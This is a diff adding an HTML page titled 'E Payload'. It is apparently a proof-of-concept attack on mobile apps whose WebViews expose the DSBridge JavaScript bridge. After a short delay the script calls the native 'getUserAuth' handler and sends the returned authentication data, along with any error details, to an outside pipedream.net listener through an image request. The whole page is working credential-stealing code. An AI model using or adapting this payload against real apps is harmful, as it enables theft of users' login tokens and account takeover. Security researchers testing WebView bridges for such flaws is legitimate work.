@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>E Payload</title>
+    <style> body { font-family: sans-serif; background-color: #lightyellow; padding: 10px; } </style>
+</head>
+<body>
+    <h1>E Payload Loaded!</h1>
+    <p>Origin: <script>document.write(window.location.origin);</script></p>
+    <p>Attempting to access DSBridge and call getUserAuth...</p>
+    <p id="status">Status: Initializing...</p>
+
+<script>
+    const LISTENER_URL_BASE = "https://eo44gjggs7bwq2a.m.pipedream.net";
+
+    const statusP = document.getElementById('status');
+
+    function updateStatus(message) {
+        console.log(message);
+        statusP.textContent = "Status: " + message;
+    }
+
+    function logToServer(data) {
+        try {
+            let encodedData = encodeURIComponent(JSON.stringify(data));
+            let requestUrl = LISTENER_URL_BASE + "?domain=asdex.me&data=" + encodedData;
+            console.log("Sending GET request to listener:", requestUrl);
+            var img = new Image();
+            img.src = requestUrl;
+            updateStatus("Data sent to listener (check logs).");
+        } catch (e) {
+            console.error("Error encoding/sending data: ", e);
+            updateStatus("Error sending data to listener: " + e);
+        }
+    }
+
+    setTimeout(function() {
+        updateStatus("Attempting DSBridge call after delay...");
+        console.log("Attempting DSBridge call after delay...");
+
+        if (window.dsBridge) {
+             updateStatus("dsBridge object FOUND! Using callHandler...");
+             console.log("dsBridge object found. Using callHandler...");
+             try {
+                 
+                 window.dsBridge.callHandler('getUserAuth', {}, function(authData) {
+                     updateStatus("SUCCESS: getUserAuth callback received!");
+                     console.log("Callback received from callHandler('getUserAuth'):", authData);
+                     logToServer({ type: 'gUA_SUCCESS_asdex.me', content: authData });
+                     
+                 });
+             } catch (e) {
+                 updateStatus("ERROR calling dsBridge.callHandler('getUserAuth'): " + e);
+                 console.error("Error using dsBridge.callHandler('getUserAuth'):", e);
+                 logToServer({ type: 'gUA_ERR_call_asdex.me', content: e.toString() });
+             }
+        } else {
+             updateStatus("dsBridge object NOT found.");
+             console.error("dsBridge object not found.");
+             logToServer({ type: 'gUA_ERR_nobridge_asdex.me' });
+     
+        }
+    }, 2500); 
+
+</script>
+
+</body>
+</html>
